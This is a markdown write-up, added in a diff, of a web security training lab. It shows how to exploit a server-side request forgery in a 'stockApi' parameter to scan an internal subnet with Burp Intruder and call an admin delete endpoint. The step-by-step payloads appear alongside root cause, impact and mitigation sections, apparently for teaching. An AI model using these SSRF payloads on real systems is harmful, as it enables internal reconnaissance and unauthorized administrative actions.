@@ -1,0 +1,264 @@
+# SSRF via Internal Network Enumeration
+
+## Objective
+
+The objective of this lab is to exploit a **Server-Side Request Forgery (SSRF)** vulnerability to enumerate an internal network, identify the host exposing an administrative interface, and leverage the vulnerability to perform an administrative action by deleting the user **carlos**.
+
+---
+
+# Vulnerability Overview
+
+The application accepts a user-controlled URL through the `stockApi` parameter and performs an HTTP request to that destination on behalf of the user.
+
+Since the destination is not properly validated, an attacker can force the application to send requests to internal hosts that are otherwise inaccessible from the Internet.
+
+This behavior enables:
+
+* Internal network enumeration
+* Discovery of hidden services
+* Access to internal administrative interfaces
+* Execution of privileged actions
+
+---
+
+# Step 1 – Intercept the Stock Check Request
+
+Browse to any product and click **Check stock**.
+
+Intercept the request using **Burp Suite Proxy**.
+
+The intercepted request is similar to:
+
+```http
+POST /product/stock HTTP/2
+
+stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
+```
+
+---
+
+# Step 2 – Send the Request to Intruder
+
+Right-click the intercepted request and select:
+
+```
+Send to Intruder
+```
+
+---
+
+# Step 3 – Modify the Target URL
+
+Replace the original value of the `stockApi` parameter with:
+
+```
+http://192.168.0.1:8080/admin
+```
+
+The request now becomes:
+
+```http
+POST /product/stock HTTP/2
+
+stockApi=http://192.168.0.1:8080/admin
+```
+
+---
+
+# Step 4 – Configure the Payload Position
+
+Highlight only the last octet of the IP address:
+
+```
+http://192.168.0.§1§:8080/admin
+```
+
+Only the final digit should be marked as the payload position.
+
+---
+
+# Step 5 – Configure Burp Intruder
+
+Navigate to the **Payloads** tab and configure the following values:
+
+| Setting      |   Value |
+| ------------ | ------: |
+| Payload type | Numbers |
+| From         |       1 |
+| To           |     255 |
+| Step         |       1 |
+
+Burp Intruder will automatically generate requests such as:
+
+```
+http://192.168.0.1:8080/admin
+http://192.168.0.2:8080/admin
+http://192.168.0.3:8080/admin
+...
+http://192.168.0.255:8080/admin
+```
+
+---
+
+# Technical Explanation
+
+The vulnerable application issues an HTTP request to the URL supplied in the `stockApi` parameter.
+
+By automating the last octet of the IP address, Burp Intruder forces the application to probe every host within the internal `/24` subnet.
+
+Conceptually, the application behaves as follows:
+
+```python
+for ip in range(1, 256):
+    requests.get(f"http://192.168.0.{ip}:8080/admin")
+```
+
+Unlike a traditional port scan performed from the attacker's machine, every request originates from the vulnerable server itself, allowing access to internal resources that are unreachable externally.
+
+---
+
+# Step 6 – Launch the Attack
+
+Click **Start attack**.
+
+Burp will send one request for every IP address between:
+
+```
+192.168.0.1
+```
+
+and
+
+```
+192.168.0.255
+```
+
+---
+
+# Step 7 – Identify the Internal Host
+
+Sort the results by the **Status** column.
+
+Most requests will return responses such as:
+
+* 404 Not Found
+* 403 Forbidden
+* 500 Internal Server Error
+
+One request should return:
+
+```
+200 OK
+```
+
+This indicates that the corresponding host exposes the administrative interface.
+
+---
+
+# Step 8 – Send the Successful Request to Repeater
+
+Select the request returning **200 OK** and send it to **Burp Repeater**.
+
+---
+
+# Step 9 – Modify the Administrative Endpoint
+
+Replace:
+
+```
+/admin
+```
+
+with:
+
+```
+/admin/delete?username=carlos
+```
+
+For example:
+
+```
+http://192.168.0.173:8080/admin/delete?username=carlos
+```
+
+Use the IP address discovered during the enumeration phase.
+
+---
+
+# Step 10 – Execute the Request
+
+Send the modified request.
+
+The vulnerable application will access the internal administrative endpoint and delete the user **carlos**, successfully completing the lab.
+
+---
+
+# Proof of Concept
+
+The SSRF vulnerability allows an attacker to instruct the server to issue arbitrary HTTP requests to internal network resources.
+
+Initial enumeration request:
+
+```
+http://192.168.0.X:8080/admin
+```
+
+Successful exploitation:
+
+```
+http://192.168.0.X:8080/admin/delete?username=carlos
+```
+
+---
+
+# Root Cause
+
+The application trusts user-controlled input when constructing outbound HTTP requests.
+
+Because the destination URL is not validated or restricted, attackers can abuse the functionality to access arbitrary internal resources.
+
+---
+
+# Impact
+
+A successful exploitation of this vulnerability may allow an attacker to:
+
+* Enumerate internal network hosts.
+* Discover hidden administrative interfaces.
+* Access internal-only applications.
+* Perform unauthorized administrative actions.
+* Pivot towards additional internal services.
+* Increase the overall attack surface of the environment.
+
+Depending on the internal infrastructure, SSRF vulnerabilities may also expose cloud metadata services, internal APIs, or sensitive management interfaces.
+
+---
+
+# Mitigation
+
+To prevent SSRF vulnerabilities:
+
+* Never allow users to specify arbitrary destination URLs.
+* Implement a strict allowlist of permitted hosts.
+* Block requests to localhost, loopback, and private IP ranges.
+* Restrict access to cloud metadata endpoints.
+* Validate URL schemes, hostnames, and resolved IP addresses.
+* Use network segmentation and firewall rules to limit outbound connections.
+* Monitor outbound requests for anomalous behavior.
+
+---
+
+# Key Takeaways
+
+This lab demonstrates that SSRF vulnerabilities are not limited to accessing known internal endpoints.
+
+A successful SSRF can also be leveraged to perform **internal network reconnaissance**, allowing attackers to discover hidden systems before targeting them.
+
+The typical attack workflow consists of:
+
+1. Confirming the SSRF vulnerability.
+2. Enumerating internal hosts.
+3. Identifying exposed services.
+4. Exploiting the discovered resources to perform privileged actions.
+
+This methodology closely reflects how SSRF vulnerabilities are exploited during real-world penetration tests.
